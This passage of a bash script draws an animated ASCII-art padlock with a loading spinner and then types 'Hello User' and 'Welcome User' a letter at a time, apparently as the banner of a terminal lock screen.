  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '\';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '|';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '/';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '-';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '\';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '|';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '/';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '-';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '\';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '|';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '/';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '-';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '\';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '|';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '/';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '-';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '\';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '|';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '/';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '-';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '\';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '|';
  clear
  echo''
  echo -e " \e[1;37m{\e[1;32mOpened\e[1;37m} ";
  echo''
  echo -e "           .-^^-.           ";
  echo -e "          / .--. \          ";
  echo -e "         / /    \ \         ";
  echo -e "         | |    | |         ";
  echo -e "                | |.-^^|.|  ";
  echo -e "               /// .::::. \ ";
  echo -e "              ||| ::\e[1;32m/  \.\e[1;37m: ;";
  echo -e "              ||; ::\e[1;32m\__/\e[1;37m:: ;";
  echo -e "               ||\ °::::° / ";
  echo -e "                °=°:-..-°°  ";
  echo''
  sleep 0.05
  printf  ' \e[1;37m[\e[1;32m*\e[1;37m]\e[1;32m Loading .....';
  printf  '/';
  echo''
  sleep 2
}
#########--C.E.N.T.E.R_S.C.R.E.E.N--#######-MRX
center_screen(){
  clear
  echo -e $white'';
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo''
  echo -e '                                             ';
  printf '                                         H'
  sleep 0.05
  printf 'e'
  sleep 0.05
  printf 'l'
  sleep 0.05
  printf 'l'
  sleep 0.05
  printf 'o'
  sleep 0.05
  printf ''
  sleep 0.3
  printf ' U'
  sleep 0.05
  printf 's'
  sleep 0.05
  printf 'e'
  sleep 0.05
  printf 'r'
  sleep 1.3
}
message(){
  echo -e $white''
  printf ' W'
  sleep 0.01
  printf 'e'
  sleep 0.01
  printf 'l'
  sleep 0.01
  printf 'c'
  sleep 0.01
  printf 'o'
  sleep 0.01
  printf 'm'
  sleep 0.01
  printf 'e'
  sleep 0.4
  printf ' U'
  sleep 0.01
  printf 's'
  sleep 0.01
  printf 'e'
  sleep 0.01
  printf 'r'
  sleep 1.2
}
center_screen
clear
Locked
